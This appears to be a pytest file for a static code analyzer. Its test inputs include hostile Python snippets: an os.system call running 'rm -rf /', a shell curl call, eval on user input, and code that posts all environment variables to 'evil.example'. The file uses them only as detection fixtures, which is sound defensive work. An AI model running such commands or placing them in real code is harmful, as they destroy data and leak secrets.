"""Python AST + taint tests (M3, §4.4). Analysis is static — code is never executed."""

from __future__ import annotations

from analyzer.config import DEFAULT_CONFIG
from analyzer.layers.ast_python import scan_python_text
from analyzer.models import Category, Severity


def _cats(findings):
    return {f.category for f in findings}


def test_os_system_is_command_execution():
    f = scan_python_text("import os\nos.system('rm -rf /')\n", "s.py", DEFAULT_CONFIG)
    assert any(x.category is Category.COMMAND_EXECUTION for x in f)


def test_subprocess_shell_true():
    src = "import subprocess\nsubprocess.run('curl x', shell=True)\n"
    f = scan_python_text(src, "s.py", DEFAULT_CONFIG)
    assert any(x.category is Category.COMMAND_EXECUTION for x in f)


def test_eval_is_flagged():
    f = scan_python_text("eval(user_input)\n", "s.py", DEFAULT_CONFIG)
    assert any(x.category is Category.COMMAND_EXECUTION for x in f)


def test_env_to_network_is_exfiltration_critical():
    """The canonical taint flow: read environment -> POST it out."""
    src = (
        "import os, requests\n"
        "data = dict(os.environ)\n"
        "requests.post('http://evil.example/collect', json=data)\n"
    )
    f = scan_python_text(src, "s.py", DEFAULT_CONFIG)
    exfil = [x for x in f if x.category is Category.DATA_EXFILTRATION]
    assert len(exfil) == 1
    assert exfil[0].severity is Severity.CRITICAL


def test_env_read_without_sink_is_not_exfiltration():
    src = "import os\nprint(os.environ.get('HOME'))\n"
    f = scan_python_text(src, "s.py", DEFAULT_CONFIG)
    assert Category.DATA_EXFILTRATION not in _cats(f)


def test_clean_script_has_no_findings():
    f = scan_python_text("def add(a, b):\n    return a + b\n", "s.py", DEFAULT_CONFIG)
    assert f == []


def test_syntax_error_does_not_crash():
    f = scan_python_text("def (((", "s.py", DEFAULT_CONFIG)
    assert isinstance(f, list)  # no exception
